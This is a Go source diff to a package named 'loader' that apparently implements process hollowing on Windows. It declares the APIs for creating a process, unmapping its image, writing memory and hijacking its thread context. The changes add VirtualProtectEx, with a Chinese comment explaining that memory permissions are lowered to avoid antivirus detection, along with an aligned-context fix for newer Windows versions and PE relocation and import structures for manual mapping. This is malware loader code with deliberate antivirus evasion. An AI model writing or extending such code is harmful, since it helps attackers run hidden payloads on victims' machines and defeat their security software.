@@ -3,21 +3,32 @@ package loader
 
 import (
 	"syscall"
+	"unsafe"
 )
 
 var (
-	kernel32                     = syscall.NewLazyDLL("kernel32.dll")
-	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
-	procCreateProcessW           = kernel32.NewProc("CreateProcessW")
-	procVirtualAllocEx           = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory       = kernel32.NewProc("WriteProcessMemory")
-	procReadProcessMemory        = kernel32.NewProc("ReadProcessMemory")
-	procGetThreadContext         = kernel32.NewProc("GetThreadContext")
-	procSetThreadContext         = kernel32.NewProc("SetThreadContext")
-	procResumeThread             = kernel32.NewProc("ResumeThread")
-	procWaitForSingleObject      = kernel32.NewProc("WaitForSingleObject") // 🌟 新增：用于等待进程结束
+	kernel32                      = syscall.NewLazyDLL("kernel32.dll")
+	ntdll                         = syscall.NewLazyDLL("ntdll.dll")
+	procCreateProcessW            = kernel32.NewProc("CreateProcessW")
+	procVirtualAllocEx            = kernel32.NewProc("VirtualAllocEx")
+	procVirtualProtectEx          = kernel32.NewProc("VirtualProtectEx") // 🌟 新增：用于后期内存权限降权，避免被杀软秒杀
+	procWriteProcessMemory        = kernel32.NewProc("WriteProcessMemory")
+	procReadProcessMemory         = kernel32.NewProc("ReadProcessMemory")
+	procGetThreadContext          = kernel32.NewProc("GetThreadContext")
+	procSetThreadContext          = kernel32.NewProc("SetThreadContext")
+	procResumeThread              = kernel32.NewProc("ResumeThread")
+	procWaitForSingleObject       = kernel32.NewProc("WaitForSingleObject")
 	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
-	procNtUnmapViewOfSection     = ntdll.NewProc("NtUnmapViewOfSection")
+	procNtUnmapViewOfSection      = ntdll.NewProc("NtUnmapViewOfSection")
+)
+
+const (
+	IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
+	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
+
+	PAGE_READWRITE         = 0x04
+	PAGE_EXECUTE_READ      = 0x20
+	PAGE_EXECUTE_READWRITE = 0x40
 )
 
 // --- 进程与线程结构体 ---
@@ -134,6 +145,20 @@ type CONTEXT64 struct {
 
 const CONTEXT_FULL = 0x10000B
 
+// 🌟 修复：NewAlignedContext 分配并返回一个严格按 16 字节对齐的 CONTEXT64 指针
+// 解决高版本 Windows 10/11 上 SetThreadContext 报 ERROR_NOACCESS 导致崩溃的致命 Bug
+func NewAlignedContext() (*CONTEXT64, []byte) {
+	// 多分配 15 个字节缓冲，确保我们可以将指针滑动到 16 的倍数地址
+	buf := make([]byte, unsafe.Sizeof(CONTEXT64{})+15)
+	ptr := uintptr(unsafe.Pointer(&buf[0]))
+	
+	// 位运算进行 16 字节对齐
+	alignedPtr := (ptr + 15) &^ 15
+	
+	// 返回对齐后的指针和 buf 引用（防止 Go GC 过早回收底层数组）
+	return (*CONTEXT64)(unsafe.Pointer(alignedPtr)), buf
+}
+
 // --- PE 结构体 ---
 type IMAGE_DOS_HEADER struct {
 	E_magic    uint16
@@ -222,4 +247,19 @@ type IMAGE_SECTION_HEADER struct {
 	NumberOfRelocations  uint16
 	NumberOfLinenumbers  uint16
 	Characteristics      uint32
+}
+
+// 🌟 新增：重定位表结构 (用于动态修正 ASLR 地址偏移)
+type IMAGE_BASE_RELOCATION struct {
+	VirtualAddress uint32
+	SizeOfBlock    uint32
+}
+
+// 🌟 新增：导入表描述符结构 (用于动态解析并加载未映射的 DLL 及函数)
+type IMAGE_IMPORT_DESCRIPTOR struct {
+	OriginalFirstThunk uint32
+	TimeDateStamp      uint32
+	ForwarderChain     uint32
+	Name               uint32
+	FirstThunk         uint32
 }
